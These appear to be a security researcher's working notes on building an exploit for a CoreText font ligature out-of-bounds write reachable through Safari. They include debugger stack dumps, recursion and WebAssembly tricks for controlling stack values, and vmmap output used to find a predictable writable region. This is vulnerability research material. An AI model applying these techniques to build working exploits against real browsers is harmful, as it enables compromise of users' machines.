tasty recursive call:

```
frame #16: 0x0000000110bbc040 WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 2800
    frame #17: 0x000000010eea85ca WebCore`WebCore::RenderBlock::layout() + 42
    frame #18: 0x0000000110bbd00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
    frame #19: 0x000000010eea85ca WebCore`WebCore::RenderBlock::layout() + 42
    frame #20: 0x0000000110bbd00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
    frame #21: 0x000000010eea85ca WebCore`WebCore::RenderBlock::layout() + 42
    frame #22: 0x0000000110bbd00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
    frame #23: 0x000000010eea85ca WebCore`WebCore::RenderBlock::layout() + 42
    frame #24: 0x0000000110bbd00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
    frame #25: 0x000000010eea85ca WebCore`WebCore::RenderBlock::layout() + 42
    frame #26: 0x0000000110bbd00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
    frame #27: 0x000000010eea85ca WebCore`WebCore::RenderBlock::layout() + 42
```

each recursive call will move stack by `0x1e0`

```
(lldbinit) frame select 16
frame #16: 0x0000000110bbc040 WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 2800
(lldbinit) p/x $rsp
(unsigned long) $2399 = 0x00007ffee22c5cd0
(lldbinit) frame select 18
frame #18: 0x0000000110bbd00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
(lldbinit) p/x $rsp
(unsigned long) $2400 = 0x00007ffee22c5eb0
(lldbinit) p/x 0x00007ffee22c5eb0-0x00007ffee22c5cd0
(long) $2401 = 0x00000000000001e0
```

it takes `1092` recursions

```
(lldbinit) p/x 0x7ffe0/0x1e0
(int) $2402 = 0x00000444
(lldbinit) p/d 0x7ffe0/0x1e0
(int) $2403 = 1092
```

is it possible??

YES, by putting recursive `<div>`s
The current poc will call the `<TGlyphInSingleRun>` version
`mbp CoreText 00007FFF21984B16`
tglyphs component stack is at `rsi`

turns out web workers have adjacent stacks, very useful
but how to trigger oob in web worker???
`OffscreenCanvas` is one way but Safari doesnt support it yet

nest js functions?

```
(lldbinit) frame select 15
frame #15: 0x00000007e449ac4e JavaScriptCore`llint_entry + 112071
(lldbinit) p/x $rsp
(unsigned long) $8 = 0x00007ffee8123240
(lldbinit) frame select 16
frame #16: 0x00000007e449ac4e JavaScriptCore`llint_entry + 112071
(lldbinit) p/x $rsp
(unsigned long) $9 = 0x00007ffee81232d0
```

```
(lldbinit) p/x 0x00007ffee81232d0-0x00007ffee8123240
(long) $10 = 0x0000000000000090
(lldbinit) p/x 0x7ffe0/0x90
(int) $11 = 0x00000e38
(lldbinit) p/d 0x7ffe0/0x90
(int) $12 = 3640
```

worth a try
works! 6000 nested calls and i push the stack high enough!

now to get a useful stack frame to modify
minh tuan suggested looking at `Source/JavaScriptCore/Runtime/ArrayPrototype.cpp`
now try calling draw in array callback

---

reproduced poc in Safari
things to note:
- make sure ligature subtable is the last subtable of the chain (means nSubtables must be modified)
- use aaa command to dump all the ligature actions values

- apparently trunglue doesnt get passed to lambda (maybe a good thing?)
- only control location (not sure if can do anything with this)

---

### 2_poc_oob_write

trunglue is only used once, to get the glyph_id, so just need one that doesnt lead to unmapped memory access, then all's good
things i tried to put as trunglue
- array: doesnt work, because it is a struct with 2 fields (structure and butterfly)
- object: works! puts a butterfly directly there 
- for those that x2, make a double whose hex starts with 8
- had to update a lig action value too

ok, managed to pass location to lambda
and managed to go into `DoLigature`
values i control:
- rsi (location - js)
- rdx (lig offset - lig offset table)

what to do now? what value to pass?

also managed to enter `TStorageRange::SetGlyphID`
which calls `[_CTNativeGlyphStorage setGlyph:atIndex:]`
possible oob in ^

but, are there any checks that prevent oob
yes this works!

so now need to figure out how to set location to be anything i want
but crash at `TStorageRange::ResetAdvance` because accessing unmapped memory
need to spray memory i guess

stack layout by dfg jit: https://zon8.re/posts/jsc-part4-the-dfg-jit-graph-optimisation/#stack-layout

is the stack layout the same across Safari restarts?

```
0x7ffee97b42c8: 0x0000000000000006 0xfffe000000000010
0x7ffee97b42d8: 0xfffe00000000000a 0xfffe000000000014
0x7ffee97b42e8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffee97b42f8: 0xfffe00000000000e 0xfffe000000000006
0x7ffee97b4308: 0xfffe000000000011 0xfffe000000000012
0x7ffee97b4318: 0xfffe000000000001 0xfffe00000000000a
0x7ffee97b4328: 0xfffe00000000000a 0xfffe00000000000c
0x7ffee97b4338: 0xfffe00000000000a 0xfffe000000000005
0x7ffee97b4348: 0xfffe00000000000f 0xfffe00000000000a
0x7ffee97b4358: 0xfffe00000000000a 0x0000000685887e80
0x7ffee97b4368: 0x0000000685887e80 0x00000006857ed710
0x7ffee97b4378: 0x000000067e0684d8 0xfffe000000000000
0x7ffee97b4388: 0xfffe000000000002 0x00007ffee97b4410
0x7ffee97b4398: 0x00004e84a54034f4 0x000000067ea98330
0x7ffee97b43a8: 0x0000000685837660 0x000000ab00000002
0x7ffee97b43b8: 0x0000000685861e40 0x0000000685a63d90
```

```
0x7ffee2d0d2c8: 0x0000000000000006 0xfffe000000000010
0x7ffee2d0d2d8: 0xfffe00000000000a 0xfffe000000000014
0x7ffee2d0d2e8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffee2d0d2f8: 0xfffe00000000000e 0xfffe000000000006
0x7ffee2d0d308: 0xfffe000000000011 0xfffe000000000012
0x7ffee2d0d318: 0xfffe000000000001 0xfffe00000000000a
0x7ffee2d0d328: 0xfffe00000000000a 0xfffe00000000000c
0x7ffee2d0d338: 0xfffe00000000000a 0xfffe000000000005
0x7ffee2d0d348: 0xfffe00000000000f 0xfffe00000000000a
0x7ffee2d0d358: 0xfffe00000000000a 0x0000000120e92698
0x7ffee2d0d368: 0x0000000120e92698 0x0000000127be7710
0x7ffee2d0d378: 0x000000012016f2e8 0xfffe000000000000
0x7ffee2d0d388: 0xfffe000000000002 0x00007ffee2d0d410
0x7ffee2d0d398: 0x000041517f9ffbd4 0x0000000120b98330
0x7ffee2d0d3a8: 0x00000001288f3320 0x000000ab00000002
0x7ffee2d0d3b8: 0x0000000120e3d068 0x00000001288dfd90
```

```
0x7ffeefb1b2c8: 0x0000000000000006 0xfffe000000000010
0x7ffeefb1b2d8: 0xfffe00000000000a 0xfffe000000000014
0x7ffeefb1b2e8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffeefb1b2f8: 0xfffe00000000000e 0xfffe000000000006
0x7ffeefb1b308: 0xfffe000000000011 0xfffe000000000012
0x7ffeefb1b318: 0xfffe000000000001 0xfffe00000000000a
0x7ffeefb1b328: 0xfffe00000000000a 0xfffe00000000000c
0x7ffeefb1b338: 0xfffe00000000000a 0xfffe000000000005
0x7ffeefb1b348: 0xfffe00000000000f 0xfffe00000000000a
0x7ffeefb1b358: 0xfffe00000000000a 0x00000004d79b4000
0x7ffeefb1b368: 0x00000004d79b4000 0x00000004d0e73010
0x7ffeefb1b378: 0x00000004d016e3e0 0xfffe000000000000
0x7ffeefb1b388: 0xfffe000000000002 0x00007ffeefb1b410
0x7ffeefb1b398: 0x00003b1c65204794 0x00000004d0b98330
0x7ffeefb1b3a8: 0x00000004d9786240 0x000000ab00000002
0x7ffeefb1b3b8: 0x00000004d0e4c068 0x00000004d977fda0
```

```
0x7ffeebc9b2c8: 0x0000000000000006 0xfffe000000000010
0x7ffeebc9b2d8: 0xfffe00000000000a 0xfffe000000000014
0x7ffeebc9b2e8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffeebc9b2f8: 0xfffe00000000000e 0xfffe000000000006
0x7ffeebc9b308: 0xfffe000000000011 0xfffe000000000012
0x7ffeebc9b318: 0xfffe000000000001 0xfffe00000000000a
0x7ffeebc9b328: 0xfffe00000000000a 0xfffe00000000000c
0x7ffeebc9b338: 0xfffe00000000000a 0xfffe000000000005
0x7ffeebc9b348: 0xfffe00000000000f 0xfffe00000000000a
0x7ffeebc9b358: 0xfffe00000000000a 0x00000007a81e28a8
0x7ffeebc9b368: 0x00000007a81e28a8 0x00000007af8c1710
0x7ffeebc9b378: 0x00000007a816c2e8 0xfffe000000000000
0x7ffeebc9b388: 0xfffe000000000002 0x00007ffeebc9b410
0x7ffeebc9b398: 0x000042256a804a55 0x00000007a8b98330
0x7ffeebc9b3a8: 0x00000007b18bb320 0x000000ab00000002
0x7ffeebc9b3b8: 0x00000007a8e29068 0x00000007b18a7d90
```

```
0x7ffee20c82c8: 0x0000000000000006 0xfffe000000000010
0x7ffee20c82d8: 0xfffe00000000000a 0xfffe000000000014
0x7ffee20c82e8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffee20c82f8: 0xfffe00000000000e 0xfffe000000000006
0x7ffee20c8308: 0xfffe000000000011 0xfffe000000000012
0x7ffee20c8318: 0xfffe000000000001 0xfffe00000000000a
0x7ffee20c8328: 0xfffe00000000000a 0xfffe00000000000c
0x7ffee20c8338: 0xfffe00000000000a 0xfffe000000000005
0x7ffee20c8348: 0xfffe00000000000f 0xfffe00000000000a
0x7ffee20c8358: 0xfffe00000000000a 0x00000006d63e28a8
0x7ffee20c8368: 0x00000006d63e28a8 0x00000006ddcc1710
0x7ffee20c8378: 0x00000006d636c2e8 0xfffe000000000000
0x7ffee20c8388: 0xfffe000000000002 0x00007ffee20c8410
0x7ffee20c8398: 0x00002d0494604a54 0x00000006d6d98330
0x7ffee20c83a8: 0x00000006de9b7320 0x000000ab00000002
0x7ffee20c83b8: 0x00000006d702e068 0x00000006de9a3d90
```

on safari technology preview:

```
0x7ffee62692d8: 0x0000000000000006 0xfffe000000000010
0x7ffee62692e8: 0xfffe00000000000a 0xfffe000000000014
0x7ffee62692f8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffee6269308: 0xfffe00000000000e 0xfffe000000000006
0x7ffee6269318: 0xfffe000000000011 0xfffe000000000012
0x7ffee6269328: 0xfffe000000000001 0xfffe00000000000a
0x7ffee6269338: 0xfffe00000000000a 0xfffe00000000000c
0x7ffee6269348: 0xfffe00000000000a 0xfffe000000000005
0x7ffee6269358: 0xfffe00000000000f 0xfffe00000000000a
0x7ffee6269368: 0xfffe00000000000a 0x00000001c81e2328
0x7ffee6269378: 0x00000001c81e2328 0x00000001c81df4f0
0x7ffee6269388: 0x00000001d0178088 0xfffe000000000000
0x7ffee6269398: 0xfffe000000000002 0x00007ffee6269420
0x7ffee62693a8: 0x0000349eb8001eeb 0x00000001c8b3c300
0x7ffee62693b8: 0x00000001d047c460 0x000000ab00000002
0x7ffee62693c8: 0x00000001c8fe4668 0x00000001d046bda0
```

```
0x7ffeef7cc2d8: 0x0000000000000006 0xfffe000000000010
0x7ffeef7cc2e8: 0xfffe00000000000a 0xfffe000000000014
0x7ffeef7cc2f8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffeef7cc308: 0xfffe00000000000e 0xfffe000000000006
0x7ffeef7cc318: 0xfffe000000000011 0xfffe000000000012
0x7ffeef7cc328: 0xfffe000000000001 0xfffe00000000000a
0x7ffeef7cc338: 0xfffe00000000000a 0xfffe00000000000c
0x7ffeef7cc348: 0xfffe00000000000a 0xfffe000000000005
0x7ffeef7cc358: 0xfffe00000000000f 0xfffe00000000000a
0x7ffeef7cc368: 0xfffe00000000000a 0x0000000582be2328
0x7ffeef7cc378: 0x0000000582be2328 0x0000000582bdf4f0
0x7ffeef7cc388: 0x000000058ab92e68 0xfffe000000000000
0x7ffeef7cc398: 0xfffe000000000002 0x00007ffeef7cc420
0x7ffeef7cc3a8: 0x00004f4e36e01eec 0x000000058353c300
0x7ffeef7cc3b8: 0x000000058ae7c460 0x000000ab00000002
0x7ffeef7cc3c8: 0x00000005839e4668 0x000000058ae78000
```

```
0x7ffee89352d8: 0x0000000000000006 0xfffe000000000010
0x7ffee89352e8: 0xfffe00000000000a 0xfffe000000000014
0x7ffee89352f8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffee8935308: 0xfffe00000000000e 0xfffe000000000006
0x7ffee8935318: 0xfffe000000000011 0xfffe000000000012
0x7ffee8935328: 0xfffe000000000001 0xfffe00000000000a
0x7ffee8935338: 0xfffe00000000000a 0xfffe00000000000c
0x7ffee8935348: 0xfffe00000000000a 0xfffe000000000005
0x7ffee8935358: 0xfffe00000000000f 0xfffe00000000000a
0x7ffee8935368: 0xfffe00000000000a 0x000000010eae2328
0x7ffee8935378: 0x000000010eae2328 0x000000010eadf4f0
0x7ffee8935388: 0x000000010f785fa8 0xfffe000000000000
0x7ffee8935398: 0xfffe000000000002 0x00007ffee8935420
0x7ffee89353a8: 0x00005eab37001eeb 0x000000010f43c300
0x7ffee89353b8: 0x000000011cf7c460 0x000000ab00000002
0x7ffee89353c8: 0x000000010f8e4668 0x000000011cf6bda0
```

stack layout for 2 diff versions of safari are the same
ok
just the offsets are different but that's ok

now, trying to get better control of `location`:

try with bias of 0x2000...

```
0x7ffee90e92b8: 0x2000000a3fb26401 0xfffe000000000010
0x7ffee90e92c8: 0xfffe00000000000a 0xfffe000000000014
0x7ffee90e92d8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffee90e92e8: 0xfffe00000000000e 0x401a000000000000
0x7ffee90e92f8: 0xfffe000000000011 0xfffe000000000012
0x7ffee90e9308: 0x3ff2000000000000 0xfffe00000000000a
0x7ffee90e9318: 0xfffe00000000000a 0xfffe00000000000c
0x7ffee90e9328: 0xfffe00000000000a 0x4016000000000000
0x7ffee90e9338: 0xfffe00000000000f 0xfffe00000000000a
0x7ffee90e9348: 0xfffe00000000000a 0x00000004a81e2cc8
0x7ffee90e9358: 0x00000004a81e2cc8 0x00000004a8181010
0x7ffee90e9368: 0x00000004a816c2e8 0xfffe000000000000
0x7ffee90e9378: 0xfffe000000000002 0x00007ffee90e9400
0x7ffee90e9388: 0x000052b288604495 0x00000004a8b98330
0x7ffee90e9398: 0x00000004b07ef320 0x000000ab00000002
0x7ffee90e93a8: 0x00000004a8e32068 0x00000004b07ebd90
```

try with bias of 0x4000...

```
0x7ffeec0642b8: 0x4000000a3fb26401 0xfffe000000000010
0x7ffeec0642c8: 0xfffe00000000000a 0xfffe000000000014
0x7ffeec0642d8: 0xfffe00000000000a 0xfffe00000000000a
0x7ffeec0642e8: 0xfffe00000000000e 0x401a000000000000
0x7ffeec0642f8: 0xfffe000000000011 0xfffe000000000012
0x7ffeec064308: 0x3ff2000000000000 0xfffe00000000000a
0x7ffeec064318: 0xfffe00000000000a 0xfffe00000000000c
0x7ffeec064328: 0xfffe00000000000a 0x4016000000000000
0x7ffeec064338: 0xfffe00000000000f 0xfffe00000000000a
0x7ffeec064348: 0xfffe00000000000a 0x00000001c07e28a8
0x7ffeec064358: 0x00000001c07e28a8 0x00000001c0782010
0x7ffeec064368: 0x00000001c076c2e8 0xfffe000000000000
0x7ffeec064378: 0xfffe000000000002 0x00007ffeec064400
0x7ffeec064388: 0x000039b69de04a94 0x00000001c1198330
0x7ffeec064398: 0x00000001c8eb7320 0x000000ab00000002
0x7ffeec0643a8: 0x00000001c1419068 0x00000001c8eafd90
```

some new interesting values appear
but still stuck with how to control values on the stack fully because of the nan-boxing

---

### 3_poc_wasm

akash suggested to try wasm, sounds like a good idea because might be able to put raw values on the stack
after some experiments, indeed it is possible to put any values i want on the stack
however, one small setback - i need to find valid addresses for trunglue because i cant put jsvalues on the stack anymore (or at least at the moment it seems)

need more experimenting to see if i can get the addresses of js objects

maybe spray many objects and see if any address is predictable

idea:
- overwrite something else in the object instead first?

todo:
- look through the struct/heap, see if there is anything good to overwrite
- continue trying to spray the heap to see whats new

good read http://liam.flookes.com/wp/2012/05/03/finding-ios-memory/

this is hard, tried spraying canvases but took up 8gb
need to find way to allocate new mappings but also free up unused memory

idea:
- spam butterflies?

how about directly writing to the stack using the oob write?

distance between stack and heap (default malloc zone):

```
>>> 0x00007FFEE2A74000-0x00007FEF6B000000
0xf77a74000
```

```
(lldbinit) p/d 0xf77a74000
(long) $171 = 66431959040
```

it is probably not feasible to have heap mapped after the stack

tried spamming butterflies also not too useful
because gigacage is very big, and will always change address

--- 

side track: check vmmap of 11.4 vm

```
__DATA_CONST             [0x00007FFF8A930320 - 0x00007FFF8A975C90) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/SafariSharedUI.framework/Versions/A/SafariSharedUI
__DATA_CONST             [0x00007FFF8A9E1F90 - 0x00007FFF8A9E49B0) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/FlightUtilitiesCore.framework/Versions/A/FlightUtilitiesCore
__DATA_CONST             [0x00007FFF8AA275E8 - 0x00007FFF8AA27820) - rw-/rw- SM=COW /usr/lib/swift/libswiftOSLog.dylib
__DATA_CONST             [0x00007FFF8AA27AD0 - 0x00007FFF8AA39BB0) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/WebInspector.framework/Versions/A/WebInspector
__DATA_CONST             [0x00007FFF8AD610B0 - 0x00007FFF8AD77F70) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/Symbolication.framework/Versions/A/Symbolication
__DATA_CONST             [0x00007FFF8AD77F70 - 0x00007FFF8AD7D298) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/ScreenTimeUI.framework/Versions/A/ScreenTimeUI
__DATA_CONST             [0x00007FFF8AF44F40 - 0x00007FFF8AF46760) - rw-/rw- SM=COW /System/Library/Frameworks/OSLog.framework/Versions/A/OSLog
__DATA_CONST             [0x00007FFF8D1C9520 - 0x00007FFF8D1C9738) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libCoreFSCache.dylib
__DATA_CONST             [0x00007FFF8D1C9738 - 0x00007FFF8D1C9898) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libCVMSPluginSupport.dylib
__DATA_CONST             [0x00007FFF8D1C98A0 - 0x00007FFF8D1CA410) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libGFXShared.dylib
__DATA_CONST             [0x00007FFF8D1CA410 - 0x00007FFF8D1CA5F0) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libGLImage.dylib
__DATA_CONST             [0x00007FFF8D282260 - 0x00007FFF8D28DB18) - rw-/rw- SM=COW /System/Library/Frameworks/OpenCL.framework/Versions/A/OpenCL
__DATA_CONST             [0x00007FFF8D2BA5A8 - 0x00007FFF8D2C8C10) - rw-/rw- SM=COW /System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio
__DATA_CONST             [0x00007FFF8D38BBD0 - 0x00007FFF8D390958) - rw-/rw- SM=COW /System/Library/Frameworks/ExternalAccessory.framework/ExternalAccessory
__DATA_CONST             [0x00007FFF8D8629C8 - 0x00007FFF8D866278) - rw-/rw- SM=COW ...meworks/Symptoms.framework/Frameworks/SymptomAnalytics.framework/Versions/A/SymptomAnalytics
__DATA_CONST             [0x00007FFF8D8A5530 - 0x00007FFF8D8A9260) - rw-/rw- SM=COW ...ms.framework/Frameworks/SymptomPresentationFeed.framework/Versions/A/SymptomPresentationFeed
__DATA_CONST             [0x00007FFF8DAB8988 - 0x00007FFF8DAB8C38) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
__OBJC_RW                [0x00007FFF8E1E7000 - 0x00007FFF8E200000) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E200000 - 0x00007FFF8E453000) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
```

after restart:

```
__DATA_CONST             [0x00007FFF8A921320 - 0x00007FFF8A966C90) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/SafariSharedUI.framework/Versions/A/SafariSharedUI
__DATA_CONST             [0x00007FFF8A9D2F90 - 0x00007FFF8A9D59B0) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/FlightUtilitiesCore.framework/Versions/A/FlightUtilitiesCore
__DATA_CONST             [0x00007FFF8AA185E8 - 0x00007FFF8AA18820) - rw-/rw- SM=COW /usr/lib/swift/libswiftOSLog.dylib
__DATA_CONST             [0x00007FFF8AA18AD0 - 0x00007FFF8AA2ABB0) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/WebInspector.framework/Versions/A/WebInspector
__DATA_CONST             [0x00007FFF8AD520B0 - 0x00007FFF8AD68F70) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/Symbolication.framework/Versions/A/Symbolication
__DATA_CONST             [0x00007FFF8AD68F70 - 0x00007FFF8AD6E298) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/ScreenTimeUI.framework/Versions/A/ScreenTimeUI
__DATA_CONST             [0x00007FFF8AF35F40 - 0x00007FFF8AF37760) - rw-/rw- SM=COW /System/Library/Frameworks/OSLog.framework/Versions/A/OSLog
__DATA_CONST             [0x00007FFF8D1BA520 - 0x00007FFF8D1BA738) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libCoreFSCache.dylib
__DATA_CONST             [0x00007FFF8D1BA738 - 0x00007FFF8D1BA898) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libCVMSPluginSupport.dylib
__DATA_CONST             [0x00007FFF8D1BA8A0 - 0x00007FFF8D1BB410) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libGFXShared.dylib
__DATA_CONST             [0x00007FFF8D1BB410 - 0x00007FFF8D1BB5F0) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libGLImage.dylib
__DATA_CONST             [0x00007FFF8D273260 - 0x00007FFF8D27EB18) - rw-/rw- SM=COW /System/Library/Frameworks/OpenCL.framework/Versions/A/OpenCL
__DATA_CONST             [0x00007FFF8D2AB5A8 - 0x00007FFF8D2B9C10) - rw-/rw- SM=COW /System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio
__DATA_CONST             [0x00007FFF8D37CBD0 - 0x00007FFF8D381958) - rw-/rw- SM=COW /System/Library/Frameworks/ExternalAccessory.framework/ExternalAccessory
__DATA_CONST             [0x00007FFF8D8539C8 - 0x00007FFF8D857278) - rw-/rw- SM=COW ...meworks/Symptoms.framework/Frameworks/SymptomAnalytics.framework/Versions/A/SymptomAnalytics
__DATA_CONST             [0x00007FFF8D896530 - 0x00007FFF8D89A260) - rw-/rw- SM=COW ...ms.framework/Frameworks/SymptomPresentationFeed.framework/Versions/A/SymptomPresentationFeed
__DATA_CONST             [0x00007FFF8DAA9988 - 0x00007FFF8DAA9C38) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
__OBJC_RW                [0x00007FFF8E1D8000 - 0x00007FFF8E200000) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E200000 - 0x00007FFF8E444000) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
```

all changed except the last map :O
cool we can write stuff there since we got rw perms

another restart:

```
__DATA_CONST             [0x00007FFF8A7DB320 - 0x00007FFF8A821000) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/SafariSharedUI.framework/Versions/A/SafariSharedUI
__DATA_CONST             [0x00007FFF8A88CF90 - 0x00007FFF8A88F9B0) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/FlightUtilitiesCore.framework/Versions/A/FlightUtilitiesCore
__DATA_CONST             [0x00007FFF8A8D25E8 - 0x00007FFF8A8D2820) - rw-/rw- SM=COW /usr/lib/swift/libswiftOSLog.dylib
__DATA_CONST             [0x00007FFF8A8D2AD0 - 0x00007FFF8A8E4BB0) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/WebInspector.framework/Versions/A/WebInspector
__DATA_CONST             [0x00007FFF8AC0C0B0 - 0x00007FFF8AC22F70) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/Symbolication.framework/Versions/A/Symbolication
__DATA_CONST             [0x00007FFF8AC22F70 - 0x00007FFF8AC28298) - rw-/rw- SM=COW /System/Library/PrivateFrameworks/ScreenTimeUI.framework/Versions/A/ScreenTimeUI
__DATA_CONST             [0x00007FFF8ADEFF40 - 0x00007FFF8ADF1760) - rw-/rw- SM=COW /System/Library/Frameworks/OSLog.framework/Versions/A/OSLog
__DATA_CONST             [0x00007FFF8D074520 - 0x00007FFF8D074738) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libCoreFSCache.dylib
__DATA_CONST             [0x00007FFF8D074738 - 0x00007FFF8D074898) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libCVMSPluginSupport.dylib
__DATA_CONST             [0x00007FFF8D0748A0 - 0x00007FFF8D075410) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libGFXShared.dylib
__DATA_CONST             [0x00007FFF8D075410 - 0x00007FFF8D0755F0) - rw-/rw- SM=COW /System/Library/Frameworks/OpenGL.framework/Versions/A/Libraries/libGLImage.dylib
__DATA_CONST             [0x00007FFF8D12D260 - 0x00007FFF8D138B18) - rw-/rw- SM=COW /System/Library/Frameworks/OpenCL.framework/Versions/A/OpenCL
__DATA_CONST             [0x00007FFF8D1655A8 - 0x00007FFF8D173C10) - rw-/rw- SM=COW /System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio
__DATA_CONST             [0x00007FFF8D236BD0 - 0x00007FFF8D23B958) - rw-/rw- SM=COW /System/Library/Frameworks/ExternalAccessory.framework/ExternalAccessory
__DATA_CONST             [0x00007FFF8D70D9C8 - 0x00007FFF8D711278) - rw-/rw- SM=COW ...meworks/Symptoms.framework/Frameworks/SymptomAnalytics.framework/Versions/A/SymptomAnalytics
__DATA_CONST             [0x00007FFF8D750530 - 0x00007FFF8D754260) - rw-/rw- SM=COW ...ms.framework/Frameworks/SymptomPresentationFeed.framework/Versions/A/SymptomPresentationFeed
__DATA_CONST             [0x00007FFF8D963988 - 0x00007FFF8D963C38) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
__OBJC_RW                [0x00007FFF8E092000 - 0x00007FFF8E200000) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E200000 - 0x00007FFF8E2FE000) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
```

lucky

with this, managed to achieve relative oob write from the heap in 3_poc_wasm
(haven't tried with bigger offsets, suspect that some will result in accessing unmapped memory so need some spraying maybe)

### 4_poc_vtable

at this point, i think this is the furthest i can go, spraying doesnt seem to give any predictable addresses

one last try, maybe overwriting vtables? the only functions that use vtables start from `TFont::GetUnsummedAdvancesForGlyphs`

todo:
- check if this is at a predictable offset from oob base

```
(lldbinit) bt 12
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00007fff21a71dda CoreText`TFont::GetUnsummedAdvancesForGlyphs(unsigned short const*, CGSize*, long, CTFontOrientation) const
    frame #1: 0x00007fff21a9d2c3 CoreText`TStorageRange::ResetAdvance(long, TFont const&) + 91
    frame #2: 0x00007fff21a9c278 CoreText`void TRunGlue::SetGlyphID<true>(long, unsigned short, bool*) + 412
    frame #3: 0x00007fff21aba15c CoreText`TGlyphIterator::DoLigature(long, unsigned short, long const*, unsigned long) + 44
    frame #4: 0x00007fff21aea54c CoreText`bool TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyphInSingleRun>(TRunGlue&, unsigned short, TAATMorphSubtableMorx::MorxLigatureState*, MorphActionResultCode&)::'lambda'()::operator()() const + 810
```

`TStorageRange` glyphs glyphs vs `TFont`

```
(lldbinit) tele 0x7f97d0e53cb0
['0x7f97d0e53cb0']
CODE | STACK | HEAP | DATA
0x7f97d0e53cb0:	0x1550106011100f6
0x7f97d0e53cb8:	0x12d00f7000300f0
0x7f97d0e53cc0:	0x1016501150165
0x7f97d0e53cc8:	0x37000300f00155
0x7f97d0e53cd0:	0x16c010d016b00f1
0x7f97d0e53cd8:	0x16b0152016c00f4
0x7f97d0e53ce0:	0x159015f00030164
0x7f97d0e53ce8:	0x0
(lldbinit) tele 0x7f97d0e352e0
['0x7f97d0e352e0']
CODE | STACK | HEAP | DATA
0x7f97d0e352e0:	0x10
0x7f97d0e352e8:	0x7f97d0e52730
0x7f97d0e352f0:	0x4038000000000000
0x7f97d0e352f8:	0x0
0x7f97d0e35300:	0x0
0x7f97d0e35308:	0x0
0x7f97d0e35310:	0x40357b9000000000
0x7f97d0e35318:	0x401fc4a000000000
(lldbinit) p/x 0x7f97d0e53cb0-0x7f97d0e352e0
(long) $26 = 0x000000000001e9d0
```

a lot closer this time 

```
(lldbinit) tele $rdi
['$rdi']
CODE | STACK | HEAP | DATA
0x7fe5ff418820:	0x11dffff801a9d51
0x7fe5ff418828:	0x1c
0x7fe5ff418830:	0x7fe5ff420a90
0x7fe5ff418838:	0x7fe5ff420780
0x7fe5ff418840:	0x7fe5ff420a20
0x7fe5ff418848:	0x7fe5ff420940
0x7fe5ff418850:	0x0
0x7fe5ff418858:	0x0
(lldbinit) tele 0x7fe5ff420a90
['0x7fe5ff420a90']
CODE | STACK | HEAP | DATA
0x7fe5ff420a90:	0x1550106011100f6
0x7fe5ff420a98:	0x12d00f7000300f0
0x7fe5ff420aa0:	0x1016501150165
0x7fe5ff420aa8:	0x37000300f00001
0x7fe5ff420ab0:	0x16c010d016b00f1
0x7fe5ff420ab8:	0x16b0152016c00f4
0x7fe5ff420ac0:	0x159015f00030164
0x7fe5ff420ac8:	0x0
